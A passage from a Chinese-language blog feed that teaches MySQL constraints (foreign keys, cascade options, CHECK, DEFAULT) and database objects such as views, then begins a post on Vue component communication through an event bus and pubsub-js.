# &#x62A5;&#x9519;&#x539F;&#x56E0;&#x662F;&#x4E3B;&#x8868;&#x6CA1;&#x6709;&#x4E3B;&#x952E;&#x7EA6;&#x675F; =&gt; &#x5B8C;&#x6210;&#x4E3B;&#x952E;&#x6DFB;&#x52A0;&#x540E;&#x518D;&#x8FDB;&#x884C;&#x4ECE;&#x8868;&#x521B;&#x5EFA;
mysql&gt; ALTER TABLE dept1 ADD PRIMARY KEY (dept_id);
mysql&gt; DESC dept1;
mysql&gt; DESC emp1;
# &#x5916;&#x952E;&#x7EA6;&#x675F;&#x5BFC;&#x81F4;&#x4E0D;&#x80FD;&#x6DFB;&#x52A0;&#x4E3B;&#x8868;&#x4E2D;&#x6CA1;&#x6709;&#x7684;&#x5B57;&#x6BB5;&#x503C;
mysql&gt; INSERT INTO emp1 VALUES (1001,&apos;zs&apos;,10); # ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`dbtest13`.`emp1`, CONSTRAINT `fk_emp1_dept_id` FOREIGN KEY (`department_id`) REFERENCES `dept1` (`dept_id`))
# &#x5728;&#x4E3B;&#x8868;&#x4E2D;&#x6DFB;&#x52A0;&#x540E;&#x518D;&#x5411;&#x4ECE;&#x8868;&#x6DFB;&#x52A0;
mysql&gt; INSERT INTO dept1 VALUES (10, &apos;IT&apos;);
# &#x5220;&#x9664;&#x3001;&#x66F4;&#x65B0;&#x5931;&#x8D25; =&gt; &#x5916;&#x952E;&#x7EA6;&#x675F;&#x8D77;&#x4F5C;&#x7528;
mysql&gt; DELETE FROM dept1 WHERE dept_id = 10; # ERROR 1451 (23000): Cannot delete or update a parent row: a foreign key constraint fails (`dbtest13`.`emp1`, CONSTRAINT `fk_emp1_dept_id` FOREIGN KEY (`department_id`) REFERENCES `dept1` (`dept_id`))
mysql&gt; UPDATE dept1 SET dept_id = 20 WHERE dept_id = 10; # ERROR 1451 (23000): Cannot delete or update a parent row: a foreign key constraint fails (`dbtest13`.`emp1`, CONSTRAINT `fk_emp1_dept_id` FOREIGN KEY (`department_id`) REFERENCES `dept1` (`dept_id`))
/* &#x5728;&#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x5916;&#x952E;&#x7EA6;&#x675F; */
mysql&gt; CREATE TABLE dept2(dept_id INT PRIMARY KEY,dept_name VARCHAR(15));
mysql&gt; CREATE TABLE emp2(emp_id INT PRIMARY KEY AUTO_INCREMENT,emp_name VARCHAR(15),department_id INT);
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;emp2&apos;;
mysql&gt; ALTER TABLE emp2 ADD CONSTRAINT fk_emp2_dept2_id FOREIGN KEY (department_id) REFERENCES dept2(dept_id);
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;emp2&apos;;
/*
&#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;
1.&#x7B2C;&#x4E00;&#x6B65;&#x5148;&#x67E5;&#x770B;&#x7EA6;&#x675F;&#x540D;&#x548C;&#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;
SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;&#x8868;&#x540D;&#x79F0;&apos;; # &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x8868;&#x7684;&#x7EA6;&#x675F;&#x540D;
ALTER TABLE &#x4ECE;&#x8868;&#x540D; DROP FOREIGN KEY &#x5916;&#x952E;&#x7EA6;&#x675F;&#x540D;;
2.&#x7B2C;&#x4E8C;&#x6B65;&#x67E5;&#x770B;&#x7D22;&#x5F15;&#x540D;&#x548C;&#x5220;&#x9664;&#x7D22;&#x5F15;.&#x6CE8;&#x610F;&#x53EA;&#x80FD;&#x624B;&#x52A8;&#x5220;&#x9664;
SHOW INDEX FROM &#x8868;&#x540D;&#x79F0;; # &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x8868;&#x7684;&#x7D22;&#x5F15;&#x540D;
ALTER TABLE &#x4ECE;&#x8868;&#x540D; DROP INDEX &#x7D22;&#x5F15;&#x540D;;
*/
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;emp1&apos;;
mysql&gt; ALTER TABLE emp1 DROP FOREIGN KEY fk_emp1_dept_id; # &#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;
mysql&gt; ALTER TABLE emp1 DROP INDEX fk_emp1_dept_id; # &#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x5BF9;&#x5E94;&#x666E;&#x901A;&#x7D22;&#x5F15;
</code></pre>
<ul>
<li>&#x7EA6;&#x675F;&#x7B49;&#x7EA7;</li>
</ul>
<ol>
<li>Cascade =&gt; &#x7236;&#x8868;&#x4E0A;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;&#x5B50;&#x8868;&#x540C;&#x6B65;&#x64CD;&#x4F5C;&#x5339;&#x914D;&#x8BB0;&#x5F55;&#x3002;</li>
<li>Set null =&gt; &#x7236;&#x8868;&#x4E0A;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;&#x5C06;&#x5B50;&#x8868;&#x4E0A;&#x5339;&#x914D;&#x8BB0;&#x5F55;&#x7684;&#x5217;&#x8BBE;&#x4E3A; null&#x3002;&#x6CE8;&#x610F;&#x5B50;&#x8868;&#x7684;&#x5916;&#x952E;&#x5217;&#x4E0D;&#x80FD;&#x4E3A; not null&#x3002;</li>
<li>No action =&gt; &#x5982;&#x679C;&#x5B50;&#x8868;&#x4E2D;&#x6709;&#x5339;&#x914D;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x5219;&#x4E0D;&#x5141;&#x8BB8;&#x5BF9;&#x7236;&#x8868;&#x5BF9;&#x5E94;&#x5019;&#x9009;&#x952E;&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x3002;</li>
<li>Restrict =&gt; &#x540C; no action&#xFF0C;&#x90FD;&#x662F;&#x7ACB;&#x5373;&#x68C0;&#x67E5;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x3002;</li>
<li>Set default =&gt; &#x5728;&#x7236;&#x8868;&#x6709;&#x53D8;&#x66F4;&#x65F6;&#xFF0C;&#x5B50;&#x8868;&#x5C06;&#x5916;&#x952E;&#x5217;&#x8BBE;&#x7F6E;&#x6210;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x7684;&#x503C;&#xFF0C;&#x4F46; Innodb &#x4E0D;&#x80FD;&#x8BC6;&#x522B;&#x3002;</li>
<li>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x7B49;&#x7EA7;&#xFF0C;&#x5C31;&#x76F8;&#x5F53;&#x4E8E; Restrict &#x65B9;&#x5F0F;&#x3002;</li>
<li>&#x5BF9;&#x4E8E;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x6700;&#x597D;&#x662F;&#x91C7;&#x7528; ON UPDATE CASCADE ON DELETE RESTRICT &#x7684;&#x65B9;&#x5F0F;&#x3002;</li>
</ol>
<blockquote>
<p>&#x5728; MySQL &#x91CC;&#xFF0C;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x662F;&#x6709;&#x6210;&#x672C;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x6D88;&#x8017;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x3002;&#x5BF9;&#x4E8E;&#x5927;&#x5E76;&#x53D1;&#x7684; SQL &#x64CD;&#x4F5C;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x4E0D;&#x9002;&#x5408;&#x3002;&#x6BD4;&#x5982;&#x5927;&#x578B;&#x7F51;&#x7AD9;&#x7684;&#x4E2D;&#x592E;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x56E0;&#x4E3A;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x7684;&#x7CFB;&#x7EDF;&#x5F00;&#x9500;&#x800C;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x6162;&#x3002;&#x6240;&#x4EE5;&#xFF0C; MySQL &#x5141;&#x8BB8;&#x4E0D;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x7684;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x5728;&#x5E94;&#x7528;&#x5C42;&#x9762;&#x5B8C;&#x6210;&#x68C0;&#x67E5;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x903B;&#x8F91;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5373;&#x4F7F;&#x4E0D;&#x7528;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x4E5F;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x901A;&#x8FC7;&#x5E94;&#x7528;&#x5C42;&#x9762;&#x7684;&#x9644;&#x52A0;&#x903B;&#x8F91;&#xFF0C;&#x6765;&#x5B9E;&#x73B0;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x786E;&#x4FDD;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;</p>
<p>&#x300A;&#x963F;&#x91CC;&#x5F00;&#x53D1;&#x89C4;&#x8303;&#x300B;<br>
&#x3010;&#x5F3A;&#x5236;&#x3011;&#x4E0D;&#x5F97;&#x4F7F;&#x7528;&#x5916;&#x952E;&#x4E0E;&#x7EA7;&#x8054;&#xFF0C;&#x4E00;&#x5207;&#x5916;&#x952E;&#x6982;&#x5FF5;&#x5FC5;&#x987B;&#x5728;&#x5E94;&#x7528;&#x5C42;&#x89E3;&#x51B3;&#x3002;</p>
<p>&#x8BF4;&#x660E;&#xFF1A;&#xFF08;&#x6982;&#x5FF5;&#x89E3;&#x91CA;&#xFF09;&#x5B66;&#x751F;&#x8868;&#x4E2D;&#x7684; student_id &#x662F;&#x4E3B;&#x952E;&#xFF0C;&#x90A3;&#x4E48;&#x6210;&#x7EE9;&#x8868;&#x4E2D;&#x7684; student_id &#x5219;&#x4E3A;&#x5916;&#x952E;&#x3002;&#x5982;&#x679C;&#x66F4;&#x65B0;&#x5B66;&#x751F;&#x8868;&#x4E2D;&#x7684; student_id&#xFF0C;&#x540C;&#x65F6;&#x89E6;&#x53D1;&#x6210;&#x7EE9;&#x8868;&#x4E2D;&#x7684; student_id &#x66F4;&#x65B0;&#xFF0C;&#x5373;&#x4E3A;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x3002;&#x5916;&#x952E;&#x4E0E;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x9002;&#x7528;&#x4E8E;&#x5355;&#x673A;&#x4F4E;&#x5E76;&#x53D1;&#xFF0C;&#x4E0D;&#x9002;&#x5408;&#x5206;&#x5E03;&#x5F0F;&#x3001;&#x9AD8;&#x5E76;&#x53D1;&#x96C6;&#x7FA4;&#xFF1B;&#x7EA7;&#x8054;&#x66F4;&#x65B0;&#x662F;&#x5F3A;&#x963B;&#x585E;&#xFF0C;&#x5B58;&#x5728;&#x6570;&#x636E;&#x5E93;&#x66F4;&#x65B0;&#x98CE;&#x66B4;&#x7684;&#x98CE;&#x9669;&#xFF1B;&#x5916;&#x952E;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63D2;&#x5165;&#x901F;&#x5EA6;&#x3002;</p>
</blockquote>
<h3 id="check-%E7%BA%A6%E6%9D%9F">CHECK &#x7EA6;&#x675F;</h3>
<p>CHECK &#x7EA6;&#x675F;&#x7528;&#x4E8E;&#x68C0;&#x67E5;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x662F;&#x5426;&#x7B26;&#x5408;&#x8981;&#x6C42;&#xFF0C;&#x4E00;&#x822C;&#x6307;&#x7684;&#x662F;&#x503C;&#x7684;&#x8303;&#x56F4;&#x3002;&#x5728; MySQL 5.7 &#x4E2D;&#x5E76;&#x65E0;&#x4F5C;&#x7528;&#xFF0C;&#x5373;&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x9519;&#x8BEF;&#x6216;&#x8B66;&#x544A;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test10(id INT,last_name VARCHAR(15), salary DECIMAL(10,2) CHECK(salary &gt; 3000));
mysql&gt; INSERT INTO test10 VALUES(1,&apos;hz&apos;,3500);
# &#x6DFB;&#x52A0;&#x5931;&#x8D25;
mysql&gt; INSERT INTO test10 VALUES(2,&apos;hzcopy&apos;,1500); # ERROR 3819 (HY000): Check constraint &apos;test10_chk_1&apos; is violated.
</code></pre>
<h3 id="default-%E7%BA%A6%E6%9D%9F">DEFAULT &#x7EA6;&#x675F;</h3>
<p>DEFAULT &#x7EA6;&#x675F;&#x7ED9;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x67D0;&#x5217;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x503C;&#x3002;&#x4E00;&#x65E6;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x5728;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x6B64;&#x5B57;&#x6BB5;&#x6CA1;&#x6709;&#x663E;&#x5F0F;&#x8D4B;&#x503C;&#xFF0C;&#x5219;&#x8D4B;&#x503C;&#x4E3A;&#x9ED8;&#x8BA4;&#x503C;&#x3002;</p>
<pre><code class="language-sql">/* &#x5728;&#x521B;&#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x9ED8;&#x8BA4;&#x503C; */
mysql&gt; CREATE TABLE test11(id INT, last_name VARCHAR(15), salary DECIMAL(10,2) DEFAULT 2000);
mysql&gt; DESC test11;
mysql&gt; INSERT INTO test11 (id,last_name,salary) VALUES (1,&apos;hz&apos;,3000);
mysql&gt; INSERT INTO test11 (id,last_name) VALUES (2,&apos;hzcopy&apos;);
mysql&gt; SELECT * FROM test11;
/* &#x5728;&#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x9ED8;&#x8BA4;&#x503C; */
mysql&gt; CREATE TABLE test12(id INT, last_name VARCHAR(15), salary DECIMAL(10,2));
mysql&gt; DESC test12;
# ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x5B57;&#x6BB5;&#x7C7B;&#x578B; DEFAULT &#x9ED8;&#x8BA4;&#x503C;;
mysql&gt; ALTER TABLE test12 MODIFY salary DECIMAL (10,2) DEFAULT 2500;
mysql&gt; DESC test12;
/* &#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x503C; */
mysql&gt; ALTER TABLE test12 MODIFY salary DECIMAL (10,2);
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E8%B1%A1">&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;</h2>
<table>
<thead>
<tr>
<th style="text-align:center">&#x5E38;&#x89C1;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;</th>
<th style="text-align:center">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x8868; TABLE</td>
<td style="text-align:center">&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x903B;&#x8F91;&#x5355;&#x5143;&#xFF0C;&#x4EE5;&#x884C;&#x548C;&#x5217;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x5728;&#xFF0C;&#x5217;&#x5C31;&#x662F;&#x5B57;&#x6BB5;&#xFF0C;&#x884C;&#x5C31;&#x662F;&#x8BB0;&#x5F55;</td>
</tr>
<tr>
<td style="text-align:center">&#x6570;&#x636E;&#x5B57;&#x5178;</td>
<td style="text-align:center">&#x5B58;&#x653E;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x7684;&#x7CFB;&#x7EDF;&#x8868; =&gt; &#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x6570;&#x636E;&#x901A;&#x5E38;&#x7531;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x7EF4;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x5458;&#x901A;&#x5E38;&#x4E0D;&#x5E94;&#x8BE5;&#x4FEE;&#x6539;&#xFF0C;&#x53EA;&#x53EF;&#x67E5;&#x770B;</td>
</tr>
<tr>
<td style="text-align:center">&#x7EA6;&#x675F; CONSTRAINT</td>
<td style="text-align:center">&#x6267;&#x884C;&#x6570;&#x636E;&#x6821;&#x9A8C;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x7528;&#x4E8E;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x89C4;&#x5219;</td>
</tr>
<tr>
<td style="text-align:center">&#x89C6;&#x56FE; VIEW</td>
<td style="text-align:center">&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x91CC;&#x6570;&#x636E;&#x7684;&#x903B;&#x8F91;&#x663E;&#x793A;&#xFF1B;&#x89C6;&#x56FE;&#x5E76;&#x4E0D;&#x5B58;&#x50A8;&#x6570;&#x636E;</td>
</tr>
<tr>
<td style="text-align:center">&#x7D22;&#x5F15; INDEX</td>
<td style="text-align:center">&#x7528;&#x4E8E;&#x63D0;&#x9AD8;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x4E66;&#x7684;&#x76EE;&#x5F55;</td>
</tr>
<tr>
<td style="text-align:center">&#x5B58;&#x50A8;&#x8FC7;&#x7A0B; PROCEDURE</td>
<td style="text-align:center">&#x7528;&#x4E8E;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x5B8C;&#x6574;&#x7684;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#xFF0C;&#x6CA1;&#x6709;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x4F46;&#x53EF;&#x901A;&#x8FC7;&#x4F20;&#x51FA;&#x53C2;&#x6570;&#x5C06;&#x591A;&#x4E2A;&#x503C;&#x4F20;&#x7ED9;&#x8C03;&#x7528;&#x73AF;&#x5883;</td>
</tr>
<tr>
<td style="text-align:center">&#x5B58;&#x50A8;&#x51FD;&#x6570; FUNCTION</td>
<td style="text-align:center">&#x7528;&#x4E8E;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x7279;&#x5B9A;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x5177;&#x6709;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x503C;</td>
</tr>
<tr>
<td style="text-align:center">&#x89E6;&#x53D1;&#x5668; TRIGGER</td>
<td style="text-align:center">&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5668;&#xFF0C;&#x5F53;&#x6570;&#x636E;&#x5E93;&#x53D1;&#x751F;&#x7279;&#x5B9A;&#x4E8B;&#x4EF6;&#x540E;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x88AB;&#x89E6;&#x53D1;&#xFF0C;&#x5B8C;&#x6210;&#x76F8;&#x5E94;&#x7684;&#x5904;&#x7406;</td>
</tr>
</tbody>
</table>
<h3 id="%E8%A7%86%E5%9B%BE">&#x89C6;&#x56FE;</h3>
<p>&#x89C6;&#x56FE;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8868;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x9700;&#x6C42;&#x5236;&#x5B9A;&#x4E0D;&#x540C;&#x7684;&#x67E5;&#x8BE2;&#x89C6;&#x56FE;&#xFF0C;&#x5373;&#x9488;&#x5BF9;&#x6307;&#x5B9A;&#x7684;&#x4EBA;&#x5458;&#x53EA;&#x5C55;&#x793A;&#x90E8;&#x5206;&#x7684;&#x6570;&#x636E;&#x3002;&#x672C;&#x8D28;&#x662F;&#x4E00;&#x6BB5;&#x5B58;&#x50A8;&#x8D77;&#x6765;&#x7684; SELECT&#x3002;</p>
<p>&#x89C6;&#x56FE;&#x5EFA;&#x7ACB;&#x5728;&#x5DF2;&#x6709;&#x8868;&#xFF08;&#x57FA;&#x8868;&#xFF09;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x865A;&#x62DF;&#x8868;&#xFF0C;&#x672C;&#x8EAB;&#x4E0D;&#x5177;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5360;&#x7528;&#x5F88;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x3002;&#x89C6;&#x56FE;&#x7684;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x53EA;&#x5F71;&#x54CD;&#x89C6;&#x56FE;&#x672C;&#x8EAB;&#xFF0C;&#x4E0D;&#x5F71;&#x54CD;&#x5BF9;&#x5E94;&#x7684;&#x57FA;&#x8868;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x5BF9;&#x89C6;&#x56FE;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x589E;&#x5220;&#x6539;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x53D1;&#x751F;&#x76F8;&#x5E94;&#x53D8;&#x5316;&#xFF0C;&#x53CD;&#x4E4B;&#x4EA6;&#x7136;&#x3002;</p>
<ul>
<li>&#x521B;&#x5EFA;&#x89C6;&#x56FE;</li>
</ul>
<pre><code class="language-sql"># &#x5728; CREATE VIEW &#x8BED;&#x53E5;&#x4E2D;&#x5D4C;&#x5165;&#x5B50;&#x67E5;&#x8BE2;
CREATE [OR REPLACE] [ALGORITHM = {UNDEFINED | MERGE | TEMPTABLE}] VIEW &#x89C6;&#x56FE;&#x540D;&#x79F0; [(&#x5B57;&#x6BB5;&#x5217;&#x8868;)] AS &#x67E5;&#x8BE2;&#x8BED;&#x53E5; [WITH [CASCADED|LOCAL] CHECK OPTION]
</code></pre>
<h3 id="%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%87%BD%E6%95%B0">&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4E0E;&#x51FD;&#x6570;</h3>
<h3 id="%E5%8F%98%E9%87%8F%E3%80%81%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B8%8E%E6%B8%B8%E6%A0%87">&#x53D8;&#x91CF;&#x3001;&#x6D41;&#x7A0B;&#x63A7;&#x5236;&#x4E0E;&#x6E38;&#x6807;</h3>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="mysql8-%E6%96%B0%E7%89%B9%E6%80%A7">MySQL8 &#x65B0;&#x7279;&#x6027;</h2>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[组件通讯]]></title><description><![CDATA[vuex与redux]]></description><link>yourdomain.com/zu-jian-tong-xun/</link><guid isPermaLink="false">6264eec5aa2820757fbb1454</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Fri, 01 Oct 2021 13:09:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/04/treecommunicate.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF">&#x5168;&#x5C40;&#x4E8B;&#x4EF6;&#x603B;&#x7EBF;</h2>
<img src="yourdomain.com/content/images/2022/04/treecommunicate.jpg" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;"><p>&#x5728; Vue &#x7684;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x7236;&#x5B50;&#x7EC4;&#x4EF6;&#x6C9F;&#x901A;&#x65B9;&#x5F0F;&#x4E3A; props&#x3001;emit&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x662F;&#x5144;&#x5F1F;&#x7EC4;&#x4EF6;&#x3001;&#x8DE8;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x6C9F;&#x901A;&#xFF0C;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x7E41;&#x590D;&#x7684; props emit&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; Event Bus &#x6216;&#x662F; Vuex &#x6765;&#x505A;&#x3002;Event Bus &#x50CF;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x57DF;&#x7684;&#x4E8B;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x7ED9;&#x5404;&#x7EC4;&#x4EF6;&#x5171;&#x7528;&#xFF0C;&#x9002;&#x7528;&#x6CA1;&#x6709;&#x592A;&#x590D;&#x6742;&#x7684;&#x529F;&#x80FD;&#x548C;&#x4E8B;&#x4EF6;&#xFF0C;&#x5982;&#x8B66;&#x793A;&#x89C6;&#x7A97;&#xFF0C;&#x540E;&#x7EED;&#x7684; Vuex &#x5219;&#x9002;&#x5408;&#x7BA1;&#x7406;&#x8F83;&#x590D;&#x6742;&#x7684;&#x5168;&#x7AD9;&#x5171;&#x7528;&#x72B6;&#x6001;&#xFF0C;&#x5982;&#x767B;&#x5165;&#x8D44;&#x8BAF;&#x3001;&#x8D2D;&#x7269;&#x8F66;&#x2026;&#x7B49;&#x3002;</p>
<p>&#x501F;&#x52A9;&#x4E8B;&#x4EF6;&#x4E2D;&#x5FC3;&#x4F20;&#x9012;&#x6570;&#x636E;&#x9700;&#x8981;&#x63D0;&#x4F9B;&#x4E8B;&#x4EF6;&#x4E2D;&#x5FC3; <code>var hub = new Vue()</code>&#x3002;&#x4F20;&#x9012;&#x6570;&#x636E;&#x65B9;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#x89E6;&#x53D1; <code>hub.$emit(&#x65B9;&#x6CD5;&#x540D;&#xFF0C;&#x4F20;&#x9012;&#x7684;&#x6570;&#x636E;)</code>&#xFF1B;&#x63A5;&#x6536;&#x6570;&#x636E;&#x65B9;&#x901A;&#x8FC7; <code>mounted(){}</code> &#x94A9;&#x5B50;&#x4E2D;&#x76D1;&#x542C; <code>hub.$on(&#x65B9;&#x6CD5;&#x540D;)</code>&#xFF1B;&#x9500;&#x6BC1;&#x4E8B;&#x4EF6;&#x901A;&#x8FC7; <code>hub.$off(&#x65B9;&#x6CD5;&#x540D;)</code> &#x9500;&#x6BC1;&#xFF0C;&#x4E4B;&#x540E;&#x65E0;&#x6CD5;&#x518D;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x901A;&#x8BAF;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="pubsub-js">pubsub-js</h2>
<p>&#x540C;&#x6837;&#x9002;&#x7528;&#x4E8E;&#x4EFB;&#x610F;&#x7EC4;&#x4EF6;&#x95F4;&#x7684;&#x901A;&#x8BAF;&#x65B9;&#x5F0F;&#xFF0C;&#x6D88;&#x606F;&#x8BA2;&#x9605;&#x4E0E;&#x53D1;&#x5E03;&#x3002;&#x7531;&#x4E8E;&#x94FA;&#x5929;&#x76D6;&#x5730;&#x7684;&#x76F8;&#x5173;&#x5E93;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x8BF4; <a href="https://github.com/mroderick/PubSubJS">PubSubJS</a>&#x3002;</p>
<pre><code class="language-shell"># &#x5B89;&#x88C5; pubsub
npm i pubsub-js
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><iframe src="https://codesandbox.io/embed/vuecomponentscomunicate-f28mq?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="vueComponentsComunicate" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe><!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="vuex">Vuex</h2>
